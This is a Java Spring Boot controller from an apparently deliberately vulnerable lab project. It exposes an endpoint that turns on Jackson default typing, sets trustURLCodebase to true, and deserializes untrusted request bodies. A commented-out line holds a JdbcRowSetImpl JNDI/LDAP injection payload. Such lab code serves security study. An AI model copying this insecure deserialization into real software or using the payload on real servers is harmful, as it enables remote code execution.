package com.ppp.vulns.springboot2.controller.serialization;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * @author Whoopsunix
 */
@Controller
@RequestMapping("/jackson")
public class JacksonController {
    @RequestMapping("/case1")
    @ResponseBody
    public void case1(@RequestBody String requestBody, HttpServletRequest request, HttpServletResponse response) throws IOException {
        System.out.println(requestBody);
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);

        // 用ObjectMapper.disableDefaultTyping()设置为只允许@JsonTypeInfo生效
//                objectMapper.disableDefaultTyping();

//        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
//        disableDefaultTypingM.invoke(objectMapper);

//        json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/ehyo2t\",\"autoCommit\":true}";
        Object object = objectMapper.readValue(requestBody, Object.class);


        PrintWriter writer = response.getWriter();
        writer.println(object);
    }
}
